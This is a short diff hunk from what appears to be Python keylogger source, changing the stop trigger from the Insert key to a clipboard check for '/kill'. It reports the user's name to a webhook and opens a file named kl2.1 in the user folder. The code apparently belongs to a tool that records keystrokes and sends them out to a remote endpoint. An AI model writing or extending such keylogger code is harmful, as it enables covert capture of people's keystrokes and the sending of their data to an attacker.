@@ -91,7 +91,8 @@ def on_press(key):
 
 
 def on_release(key):
-    if key == keyboard.Key.insert:
+    current_clipboard = pyperclip.paste()
+    if "/kill" in current_clipboard:
         send_to_webhook(f"Connection stopped by user: {username}")
         file_path = rf"C:\users\{username}\kl2.1"  # Fixed the file path
         subprocess.run(["explorer", file_path])
